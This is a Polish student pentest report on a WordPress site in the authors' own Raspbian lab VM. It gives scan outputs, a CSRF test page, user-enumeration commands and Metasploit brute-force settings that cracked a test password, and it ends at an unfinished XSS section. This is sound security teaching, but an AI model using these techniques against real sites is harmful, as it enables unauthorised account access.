# Bezpieczeństwo IoT
Repozytorium projektu z przedmiotu BOT. 

Temat: bezpieczeństwo IoT. 

Grupa: J. Kulawik, W. Szałyga

# Cele projektu:
- Zapoznanie się z dostępnymi gotowymi rozwiązaniami usług sieciowych w IoT
- Zapoznanie się ze specyfiką bezpieczeństwa w takich usługach
- Zaznajomienie się z rozwiązaniami wirtualizacji IoT lub instalacją oprogramowania na hardwarze
- Trening audytu środowiska bez celowo wystawionych podatności

# Zakres projektu
- Przegląd oraz wybór oprogramowania do przetestowania z zakresu IoT 

   Przykładowo, może być to:

  * gotowe oprogramowanie serwera/brokera
  * zintegrowane lub oddzielne od OS
  * maszyna wirtualna bądź rzeczywista instalacja na hardwarze  
- Pentest wybranego rozwiązania wraz z raportem

Zakres rozszerzony zrealizowany podczas realizacji celów:

- Tworzenie maszyny wirtualnej
- Zaznajomienie z podstawami konfiguracji sieciowej serwera Apache oraz systemu Linux

# Propozycja środowiska testowego

Dokonano przeglądu technologii wirtualizacyjnych IoT. Ze względu na małą dostępność maszyn  wirtualnych IoT, zdecydowano się na stworzenie własnej za pomocą obrazu systemu operacyjnego.

Proponowanym środowiskiem testowym jest wirtualny system Debian używany na płytkach Raspberry Pi - tzw. Raspbian.
Zgodnie ze wspomnianym poniżej poradnikiem zostanie na nim zainstalowany serwer HTTP typu LAMP.

Można zadać sobie pytanie, dlaczego Linux, skoro mowa jest o IoT? Odpowiedź jest prosta - jest to system często używany w IoT, który jest w tej dziedzinie jednym z głównych problemów z bezpieczeństwem. Malware i botnety przez niego tworzone, takie jak [Mirai](https://en.wikipedia.org/wiki/Mirai_(malware)), [Remaiten](https://en.wikipedia.org/wiki/Remaiten), [BASHLITE](https://en.wikipedia.org/wiki/BASHLITE) czy [Linux.Darlloz](https://en.wikipedia.org/wiki/Linux.Darlloz) rozprzestrzeniały się po sieciach systemów wbudowanych korzystających z Linuka. Wiele z nich wykorzystało niedbałość przy konfiguracji urządzeń, a w szczególności hasła domyślne i brak zabezpieczeń przeciw brute-force.

> *Uwaga: Podczas trwania projektu odkryto technologię Docker oraz oparty na niej dedykowany dla IoT system balenaOS. Mechanizmy wykorzystywane przez Dockera zdają się być rozwiązaniem bardzo bezpiecznym, dlatego testy aplikacji instalowanych w kontenerze mogą być ciekawym tematem na przyszłe projekty.*

Test będzie przeprowadzony w stylu greybox - siłą rzeczy znane są pewne szcegóły środowiska (w szcególności elementy konfiguracji sieciowej).
Nie będzie wykorzystywana wiedza na temat haseł oraz loginów - żeby je wykorzystać, muszą zostać wydobyte w trakcie testu.
Ze względu na infrastrukturę sieciową maszyn wirtualnych, test ten odpowiada połączeniu się do sieci np. Wi-fi organizacji/właściciela oraz testowaniu znajdującego się w niej serwera.

# Scenariusz 

Niedoświadczony w zarządzaniu użytkownik stawia prosty serwer na płytce Raspberry Pi.
Pozostawione są domyślne opcje sugerowane przez popularny poradnik ze strony RPi:
https://projects.raspberrypi.org/en/projects/lamp-web-server-with-wordpress

Sprawdzone zostanie bezpieczeństwo takiego rozwiązania, w tym instalowanej strony Wordpress.

# Przygotowania maszyny wirtualnej

Pierwszym krokiem jest stworzenie maszyny wirtualnej zgodnie z z poniższym artykułem:
https://raspberrytips.com/run-raspberry-in-virtual-machine/

Maszynie nadano 1GB RAM (zgodnie z jednym z tańszych modeli RPi).

Za pomocą generatora liczb losowych na hasło użytkownika wybrano nr. 20 (tj. "welcome") z [listy dwudziestu pięciu najpopularniejszych haseł roku 2019 wg. firmy Splashdata.](https://www.prweb.com/releases/what_do_password_and_president_trump_have_in_common_both_lost_ranking_on_splashdatas_annual_worst_passwords_list/prweb16794349.htm)

Logowanie do bazy danych wykonywane jest za pomocą polecenia ```mysql -uroot -p```.
Konto administratora Wordpress utworzono pod nazwą `admin` oraz wg. wskazówek ustawiono "wystarczająco silne" hasło: `Reks\o1997`
W rejestracji wybrano email jednego z członków grupy. Zgodnie z założeniem, dane te nie zostaną wykorzystane w penteście o ile nie zostaną podczas niego znalezione zdalnie.

Dla ułatwienia testowania, w ustawieniach strony Wordpress (Settings/General) zmieniono adres URL na `http://rpi.bot`.
Domyślne ustawienie `http://localhost` sprawiało bowiem problem z testowaniem na innych maszynach.
Następnie w pliku `/etc/hosts/` (zarówno na maszynie do testowania jak i maszynie testowanej) dodano linijkę, która rozwiązuje adres IP testowanego systemu na nazwę `rpi.bot` (a raczej vice-versa).

## Dodawanie użytkowników

W trakcie testów dodano również użytkownika testowego Wordpress o nazwie `NeilBarney`. Wordpress oferuje dobry podział przywilejów w opcjach konta, nowe konto jest jednak zakładane jako symulacja nieodpowiedzialnego sub-administratora w celu poszerzenia zakresu testu.
Użytkownikowi nadano e-mail ze strony GuerillaMail. Strona nie miała z tym problemu, co nie jest dobre - GuerillaMail to serwis tymczasowych kont e-mail, który jest używany do tworzenia alternatywnych tożsamości oraz innych kont złośliwych. Ponieważ jednak dodawanie użytkowników jest na badanej stronie manualne, można na to przymknąć oko. 

Użytkownikowi nadano hasło `qwerty123` (wybrane z tej samej listy co wcześniej, tym razem przez rzut czterema kośćmi z wynikiem 12). Strona ta ma dobry system oceniania haseł, który sprawdza entropię wpisywanego hasła oraz wymaga potwierdzenia nadania hasła słabego. Jest to dobra praktyka, którą celowo ominięto na korzyść testu - można jednak podejrzewać, że użytkownik dla wygody mógłby zrobić podobnie.

Konto to zostało dodane podczas testu, więc nie jest ono wylistowane w niektórych skanach.

# Skanowanie

Przeprowadzono skany TCP oraz UDP całej sieci. Jak można się było spodziewać, znaleziono jedynie usługę HTTP na porcie 80:

```
kali@kali:~/Desktop$ sudo nmap -sV -p-  192.168.56.133
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-22 06:33 EDT
Nmap scan report for rpi.bot (192.168.56.133)
Host is up (0.0021s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
MAC Address: 00:0C:29:60:C2:44 (VMware)
```                     
Skan UDP zwrócił wiele portów typu filtrowane/otwarte. Biorąc pod uwagę, że wynik ten jest dla UDP zwracany kiedy brak jest odpowiedzi, z pewną dozą pewności można powiedzieć że usługi te w systemie nie działają. Jedny otwarty port to NTP:
```
kali@kali:~/Desktop$ sudo nmap -sUV -F  192.168.56.133
(...)
PORT      STATE         SERVICE         VERSION
123/udp   open          ntp             NTP v4 (unsynchronized)
```

<details>
  <summary>[Rozwiń listę wszystkich przeskanowanych portów]</summary>
   
```
kali@kali:~/Desktop$ sudo nmap -sUV -F  192.168.56.133
(...)
PORT      STATE         SERVICE         VERSION
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
80/udp    open|filtered http
88/udp    open|filtered kerberos-sec
111/udp   open|filtered rpcbind
123/udp   open          ntp             NTP v4 (unsynchronized)
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
177/udp   open|filtered xdmcp
500/udp   open|filtered isakmp
623/udp   open|filtered asf-rmcp
626/udp   open|filtered serialnumberd
996/udp   open|filtered vsinet
999/udp   open|filtered applix
1025/udp  open|filtered blackjack
1028/udp  open|filtered ms-lsa
1029/udp  open|filtered solid-mux
1030/udp  open|filtered iad1
1645/udp  open|filtered radius
1646/udp  open|filtered radacct
1718/udp  open|filtered h225gatedisc
1719/udp  open|filtered h323gatestat
1812/udp  open|filtered radius
2000/udp  open|filtered cisco-sccp
2222/udp  open|filtered msantipiracy
2223/udp  open|filtered rockwell-csp2
3283/udp  open|filtered netassistant
3456/udp  open|filtered IISrpc-or-vat
4444/udp  open|filtered krb524
5353/udp  open|filtered zeroconf
5632/udp  open|filtered pcanywherestat
20031/udp open|filtered bakbonenetvault
30718/udp open|filtered unknown
31337/udp open|filtered BackOrifice
32768/udp open|filtered omad
32769/udp open|filtered filenet-rpc
32815/udp open|filtered unknown
49154/udp open|filtered unknown
49181/udp open|filtered unknown
49186/udp open|filtered unknown
49192/udp open|filtered unknown
49193/udp open|filtered unknown
49194/udp open|filtered unknown
49200/udp open|filtered unknown
```
</details>

## Nikto

Dokonano skanu strony internetowej za pomocą narzędzia Nikto. 

<details>
<summary>[Rozwiń listę wyników]</summary>

```
---------------------------------------------------------------------------
+ Target IP:          192.168.56.133
+ Target Hostname:    rpi.bot
+ Target Port:        80
+ Start Time:         2020-05-27 09:52:39 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'link' found, with multiple values: (<http://rpi.bot/wp-json/>; rel="https://api.w.org/",<http://rpi.bot/>; rel=shortlink,)
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'x-redirect-by' found, with contents: WordPress
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/wp-admin/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /wp-app.log: Wordpress' wp-app.log may leak application/system details.
+ /wordpresswp-app.log: Wordpress' wp-app.log may leak application/system details.
+ /: A Wordpress installation was found.
+ /wordpress: A Wordpress installation was found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ OSVDB-3268: /wp-content/uploads/: Directory indexing found.
+ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information
+ /wp-login.php: Wordpress login found
+ 7790 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2020-05-27 09:56:15 (GMT-4) (216 seconds)
---------------------------------------------------------------------------
```
</details>

W skan sugeruje warte przetestowania adresy oraz podatności. W szczególności znaleziono potencjalne podatności: XSS, enumaracja użytkowników, ujawnienie danych o serwerze (w tym również plik robots.txt), ciasteczka bez http-only (pozwala na kradzież ciasteczek z użyciem skryptów). 

## WPScan

Przeprowadzono skany silnika Wordpress za pomocą narzędzia WPScan.

<details>
<summary>[Rozwiń listę wyników]</summary>
   
```
_______________________________________________________________

[+] URL: http://rpi.bot/
[+] Started: Wed May 27 09:43:57 2020

Interesting Finding(s):

[+] http://rpi.bot/
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://rpi.bot/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] http://rpi.bot/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://rpi.bot/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://rpi.bot/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://rpi.bot/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Latest, released on 2020-04-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://rpi.bot/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
 |  - http://rpi.bot/comments/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://rpi.bot/wp-content/themes/twentyseventeen/
 | Latest Version: 2.3 (up to date)
 | Last Updated: 2020-03-31T00:00:00.000Z
 | Readme: http://rpi.bot/wp-content/themes/twentyseventeen/readme.txt
 | Style URL: http://rpi.bot/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://rpi.bot/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'
```
</details>

Skan dostarczył przede wszystkim kilku nowych stron wartych przetestowania. Szczególnie interesująca może być strona XML-RPC (remote procedure call). Już sama nazwa technologii wskazuje na potencjalną obecność podatności. Istotnym elementem jest również strona `readme.html` - więcej w podatności

Sprawdzono również metody enumeracji oferowane przez narzędzie. Powiodła się jedynie enumeracja użytkowników (wyniki w podatnościach).

## Pełzacz internetowy

Stronę przeskanowano również za pomocą narzędzia *msfcrawler*.

<details>
<summary>Rozwiń mapę strony</summary>

```
[*] Target: rpi.bot Port: 80 Path: / SSL: 
[*] >> [200] /
[*] >> [200] /
[*] >> [200] /about/
[*] >> [200] /blog/
[*] >> [200] /contact/
[*] >> [200] /hello-world/
[*] >> [200] /
[*] >>> [Q] s=
[*] >> [200] /wp-content/themes/twentyseventeen/assets/images/header.jpg
[*] >> [200] /feed/
[*] >> [200] /comments/feed/
[*] >> [200] /wp-includes/css/dist/block-library/style.min.css
[*] >>> [Q] ver=5.4.1
[*] >> [200] /wp-includes/css/dist/block-library/theme.min.css
[*] >>> [Q] ver=5.4.1
[*] >> [200] /wp-content/themes/twentyseventeen/style.css
[*] >>> [Q] ver=20190507
[*] >> [200] /wp-content/themes/twentyseventeen/assets/css/blocks.css
[*] >>> [Q] ver=20190105
[*] >> [200] /wp-content/themes/twentyseventeen/assets/css/colors-dark.css
[*] >>> [Q] ver=20190408
[*] >> [200] /wp-json/
[*] >> [200] /xmlrpc.php
[*] >>> [Q] rsd
[*] >> [200] /wp-includes/wlwmanifest.xml
[*] >> [200] /wp-json/oembed/1.0/embed
[*] >>> [Q] url=http%3A%2F%2Frpi.bot%2F
[*] >> [200] /wp-includes/js/jquery/jquery.js
[*] >>> [Q] ver=1.12.4-wp
[*] >> [200] /wp-includes/js/jquery/jquery-migrate.min.js
[*] >>> [Q] ver=1.4.1
[*] >> [200] /wp-content/themes/twentyseventeen/assets/js/skip-link-focus-fix.js
[*] >>> [Q] ver=20161114
[*] >> [200] /wp-content/themes/twentyseventeen/assets/js/navigation.js
[*] >>> [Q] ver=20161203
[*] >> [200] /wp-content/themes/twentyseventeen/assets/js/global.js
[*] >>> [Q] ver=20190121
[*] >> [200] /wp-content/themes/twentyseventeen/assets/js/jquery.scrollTo.js
[*] >>> [Q] ver=2.1.2
[*] >> [200] /wp-includes/js/wp-embed.min.js
[*] >>> [Q] ver=5.4.1
[*] >> [301] /
[*] >>> [Q] p=7
[301] Redirection to: http://rpi.bot/about/
[*] >> [200] /wp-json/oembed/1.0/embed
[*] >>> [Q] url=http%3A%2F%2Frpi.bot%2Fabout%2F
[*] >> [200] /wp-content/uploads/2020/05/download.png
[*] >> [301] /
[*] >>> [Q] p=8
[301] Redirection to: http://rpi.bot/contact/
[*] >> [200] /wp-json/oembed/1.0/embed
[*] >>> [Q] url=http%3A%2F%2Frpi.bot%2Fcontact%2F
[*] >> [200] /author/admin/
[*] >> [200] /tag/welcome/
[*] >> [200] /hello-world/
[*] >>> [Q] replytocom=1
[*] >> [200] /wp-comments-post.php
[*] >>> [D] author=&email=&url=&wp-comment-cookies-consent=yes&submit=Post%20Comment&comment_post_ID=1&comment_parent=0
[*] >> [200] /hello-world/feed/
[*] >> [301] /
[*] >>> [Q] p=1
[301] Redirection to: http://rpi.bot/hello-world/
[*] >> [200] /wp-json/oembed/1.0/embed
[*] >>> [Q] url=http%3A%2F%2Frpi.bot%2Fhello-world%2F
[*] >> [200] /wp-includes/js/comment-reply.min.js
[*] >>> [Q] ver=5.4.1
[*] >> [200] /the-new-umoma-opens-its-doors-2/
[*] >> [200] /a-homepage-section/
[*] >> [200] /sample-page/
[*] >> [200] /search/feed/rss2/
[*] >> [200] /author/admin/feed/
[*] >> [200] /tag/welcome/feed/
[*] >> [200] /hello-world/
[*] >> [200] /wp-comments-post.php
[*] >>> [D] author=&email=&url=&wp-comment-cookies-consent=yes&submit=Post%20Comment&comment_post_ID=1&comment_parent=1
[*] >> [405] /xmlrpc.php
[*] Unhandled 405
[*] >> [200] /wp-content/uploads/2020/05/2020-landscape-1.png
[*] >> [301] /
[*] >>> [Q] p=6
[301] Redirection to: http://rpi.bot/the-new-umoma-opens-its-doors-2/
[*] >> [200] /wp-json/oembed/1.0/embed
[*] >>> [Q] url=http%3A%2F%2Frpi.bot%2Fthe-new-umoma-opens-its-doors-2%2F
[*] >> [200] /wp-content/uploads/2020/05/espresso.jpg
[*] >> [301] /
[*] >>> [Q] p=15
[301] Redirection to: http://rpi.bot/a-homepage-section/
[*] >> [200] /wp-json/oembed/1.0/embed
[*] >>> [Q] url=http%3A%2F%2Frpi.bot%2Fa-homepage-section%2F
[*] >> [200] /sample-page/feed/
[*] >> [301] /
[*] >>> [Q] p=2
[301] Redirection to: http://rpi.bot/sample-page/
[*] >> [200] /wp-json/oembed/1.0/embed
[*] >>> [Q] url=http%3A%2F%2Frpi.bot%2Fsample-page%2F
```
</details>

## Przegląd manualny

Inne strony warte sprawdzenia:

- Strona wyszukiwania - `http://rpi.bot/?s=search-term` - 
- Sekcja komentarzy pod blogiem, np. `http://rpi.bot/hello-world/`

# Znalezione false positives
- Katalog `/wp-content/uploads/` został sprawdzony pod kątem directory traversal. Strona reaguje poprawnie, tzn. czyści zapytanie z elementów `../` oraz przekierowuje najdalej do strony głównej. Zawiera on dane wysłane przez administratorów, tj. obrazki załączane do bloga.
- Pliki `/wp-app.log`, `/wordpresswp-app.log`,  nie są dostępne
- Plik `/wp-cron.php` jest pusty. Jest to skrypt, który odpowiada za planowanie zadań. Aktualnie nie są znane żadne związane z nim podatności, jednak [jego domyślna konfiguracja może być wykorzystana do ataku DDoS](https://medium.com/@thecpanelguy/the-nightmare-that-is-wpcron-php-ae31c1d3ae30).
- Katalogi `/icons` oraz `/wordpress` nie są dostępne
- Skrypt `/wp-links-opml.php` oraz plik  `license.txt` zdają się nie ujawniać żadnych danych wrażliwych 
- Zawartość pliku `robots.txt`: 
```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```
Na chwilę obecną informacje te zdają się nie być wrażliwe.
- Interfejs `/xmlrpc.php` ma liczne znane podatności, jednak zdaje się być wyłączony bądź skonfigurowany w sposób bezpieczny.

- Plik `/wp-config.php` nieautoryzowanemu użytkownikowi zwraca pustą zawartość.

## Wstrzyknięcia SQL
 
Strona została sprawdzona pod względem możliwości ataku przy użyciu SQL Injection. W tym celu wykorzystany został sqlmap. Strona, która podlegała sprawdzeniu: `http://rpi.bot/?s=search-term`

Testowanie manualne (dodawanie do zapytań znaków: `' -- ;`) nie wskazywało na obecność podatności. Mimo tego, na wszelki wypadek dokonano dalszych testów:
 
Przy użyciu Burp Suite wychwycone zostało dokładne polecenie wysyłane do serwera. Polecenie to następnie zostało przeanalizowane za pomocą narzędzia sqlmap.
 
<details>
<summary>Wynik testu</summary>
   
```
[16:17:09] [INFO] parsing HTTP request from '/home/kali/Desktop/sqlmap'
[16:17:09] [INFO] loading tamper module 'modsecurityzeroversioned'
[16:17:09] [WARNING] tamper script 'modsecurityzeroversioned' is only meant to be run against MySQL
[16:17:09] [INFO] testing connection to the target URL
[16:17:09] [INFO] testing if the target URL content is stable
[16:17:10] [INFO] target URL content is stable
[16:17:10] [INFO] testing if GET parameter 's' is dynamic
[16:17:10] [WARNING] GET parameter 's' does not appear to be dynamic
[16:17:10] [WARNING] heuristic (basic) test shows that GET parameter 's' might not be injectable
[16:17:11] [INFO] testing for SQL injection on GET parameter 's'
[16:17:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:17:11] [WARNING] reflective value(s) found and filtering out
[16:17:13] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[16:17:13] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:17:13] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[16:17:13] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[16:17:14] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[16:17:14] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[16:17:14] [INFO] testing 'MySQL inline queries'
[16:17:14] [INFO] testing 'PostgreSQL inline queries'
[16:17:14] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[16:17:14] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[16:17:15] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[16:17:15] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[16:17:15] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:17:15] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[16:17:16] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[16:17:16] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n]
[16:17:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[16:17:19] [WARNING] GET parameter 's' does not seem to be injectable
[16:17:19] [CRITICAL] all tested parameters do not appear to be injectable.
```
</details>
 
Walidacja danych przekazywanych w zapytaniu wydaje się być poprawna - narzędzie sqlmap nie wykazało żadnych podatności.

Sprawdzono również wiele innych strony korzystających z zapytań. Podobnie jak wyszukiwarka główna, nie były one podatne.

## CSRF 

W celu sprawdzenia obecności zagrożenia CSRF wykorzystane zostały dane konta administracyjnego. Stworzony został prosty złośliwy plik HTML, który na celu miał usunąć jedną ze stron: 

```
<!DOCTYPE html>
 <html>
        <body>
									<! –– Losowo wpisany nonce ––>
                <img src="http://rpi.bot/wp-admin/post.php?post=14&action=trash&_wpnonce=854fc3as2”>
        </body>
 </html>
```
Następnie zasymulowana została sytuacja, w której użytkownik zalogowany na konto o uprawnieniach administratorskich otwiera taką złośliwą stronę HTML. 

Atak nie powodzi się ponieważ WordPress wykorzystuje tokeny, a w szczególności „number used once” - inaczej „nonce”. Jest on generowany przez stronę oraz wysyłany do klienta przez wysłaniem przez niego formularza. Nonce jest tworzony na bazie parametrów sesji użytkownika. Przy wykonywaniu poleceń m.in. usuwania zawartości obowiązkowym jest odesłanie posiadanej wartości nonce, ponieważ jego wartość przed wykonaniem zapytania jest porównywana z przechowywaną przez serwer. Atakujący nie posiada poprawnej wartości nonce, więc nie może podrobić prawidłowego zapytania.

# Wykryte zagrożenia

## Jawna transmisja danych
**Stopień zagrożenia:** Średni - CVSS 5.9 (Wektor: `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:N`)

**Położenie:** `/wp-login.php`

**Opis:** Strona nie jest szyfrowana. Dane logowania są transmitowane tekstem jawnym.

**Koncepcja:** Przeglądarka zwraca uwagę na niezabezpieczoną komunikację. Za pomocą programu Wireshark przechwycono próbę logowania: 

![alt text](https://github.com/jkulawik/BOT-IoT/blob/master/encr.PNG)

Jak widać, dane logowania nie są zabezpieczone.

**Zalecenia:** Implementacja HTTPS

## Enumeracja użytkowników
**Stopień zagrożenia:** Średni - CVSS 5.3 (Wektor: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)

**Położenie:** `/wp-login.php`

**Opis:** Interfejs logowania pozwala na obecność użytkowników w systemie.

**Koncepcja:** Testowano LDAP injection. Sprawdzono nazwę użytkownika `admin)(&)` z losowym hasłem. Zwróciła ona błąd `Unknown username. Check again or try your email address.`, który różni się od błędu który wyświetla się w przypadku niepoprawnego hasła oraz poprawnego loginu, np. "admin": `Error: The password you entered for the username admin is incorrect`. Następnie sprawdzono dwadzieścia parę niepoprawnych nazw kont - zwracały ten sam błąd co wspomniany na początku.

Podatność ta może być wykorzystana automatycznie za pomocą narzędzia WPScan. Polecenie `wpscan --url rpi.bot --enumerate u` zwraca następujące wyniki:

```
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://rpi.bot/wp-json/wp/v2/users/?per_page=100&page=1
 |  Oembed API - Author URL (Aggressive Detection)
 |   - http://rpi.bot/wp-json/oembed/1.0/embed?url=http://rpi.bot/&format=json
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
 
 [+] neilbarney
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```
Należy zwrócić uwagę, że źródła tych dwóch metod enumaracji mogą być różne i wymagać oddzielnych napraw.

**Zalecenia:** Ograniczenie nieudanych liczb logowania. Przykładowo: tymczasowa blokada prób logowania dla jednego adresu IP wypadku przekroczenia dozwolonej liczby nieudanych prób logowania na nieistniejące konto.

[Poradniki zabezpieczania blogów Wordpress](https://www.getastra.com/blog/cms/wordpress-security/stop-user-enumeration/) sugerują zmianę pewnych adresów URL, ręcznie bądź z pomocą wtyczki. 

## Ujawnienie wrażliwych interfejsów
**Stopień zagrożenia:** Brak - CVSS 0.0

**Położenie:** Strona `/readme.html`

**Opis:** Strona zdradza wrażliwe elementy serwisu.

**Koncepcja:** Strona `/readme.html` jest pozostałością po procesie instalacji i zawiera potencjalnie podatne informacje oraz wiele z linków, które są rozpoznawane przez automatyczne skanery.

**Zalecenia:** Jako pozostałość po procesie instalacji, omawiana strona powinna zostać usunięta.

## Ujawnienie plików PHP
**Stopień zagrożenia:** Średni - CVSS 5.3 (Wektor: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)

**Położenie:** `rpi.bot/wp-includes/`

**Opis:** Dostępny jest katalog z indeksem plików wykonawczych serwera.

**Koncepcja:** Strona wyświetla listę plików, które wykonują różne funkcje serwera "od zaplecza". Kod tych plików nie jest możliwy do zobaczenia z przeglądarki, ponieważ zwracane są puste pliki.

**Zalecenia:** [Ukrycie wspomnianego folderu.](https://wordpress.org/support/article/hardening-wordpress/#securing-wp-includes)


## Brute force logowania
**Stopień zagrożenia:** Wysoki - CVSS 8.6  (Wektor: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L`)

**Położenie:** `/wp-login.php`

**Opis:** Liczba nieudanych prób logowania nie jest ograniczana, co pozwala na zgadywanie haseł.

**Koncepcja:** Korzystając z uzyskanej w jednej z innych podatności nazwy użytkownika, wykorzystano moduł Metasploit `scanner/http/wordpress_login_enum` do odgadnięcia hasła. Wykorzystano skróconą wersję listy haseł `rockyou.txt`.

<details>
<summary>[Pokaż wykorzystane ustawienia]</summary>

```
Module options (auxiliary/scanner/http/wordpress_login_enum):

   Name                 Current Setting         Required  Description
   ----                 ---------------         --------  -----------
   BLANK_PASSWORDS      false                   no        Try blank passwords for all users
   BRUTEFORCE           true                    yes       Perform brute force authentication
   BRUTEFORCE_SPEED     5                       yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS         false                   no        Try each user/password couple stored in the current database
   DB_ALL_PASS          false                   no        Add all passwords in the current database to the list
   DB_ALL_USERS         false                   no        Add all users in the current database to the list
   ENUMERATE_USERNAMES  false                   yes       Enumerate usernames
   PASSWORD                                     no        A specific password to authenticate with
   PASS_FILE            ~/Desktop/shortyou.txt  no        File containing passwords, one per line
   Proxies                                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RANGE_END            10                      no        Last user id to enumerate
   RANGE_START          1                       no        First user id to enumerate
   RHOSTS               192.168.56.133          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                80                      yes       The target port (TCP)
   SSL                  false                   no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS      true                    yes       Stop guessing when a credential works for a host
   TARGETURI            /                       yes       The base path to the wordpress application
   THREADS              1                       yes       The number of concurrent threads (max one per host)
   USERNAME             NeilBarney              no        A specific username to authenticate as
   USERPASS_FILE                                no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS         false                   no        Try the username as the password for all users
   USER_FILE                                    no        File containing usernames, one per line
   VALIDATE_USERS       false                   yes       Validate usernames
   VERBOSE              true                    yes       Whether to print output for all attempts
   VHOST                rpi.bot                 no        HTTP server virtual host
```
</details>

Atak powiódł się - moduł zwrócił znalezione hasło: 

`[+] / - WordPress Brute Force - SUCCESSFUL login for 'NeilBarney' : 'qwerty123'`

Strona Site Health nie zwróciła żadnych ostrzeżeń na temat ataku lub podatności.

**Zalecenia:** [Dokumentacja Wordpress](https://wordpress.org/support/article/brute-force-attacks/) zaleca wykorzystanie wtyczki lub manualną zmianę konfguracji.

## Stored XSS, kradzież ciasteczek
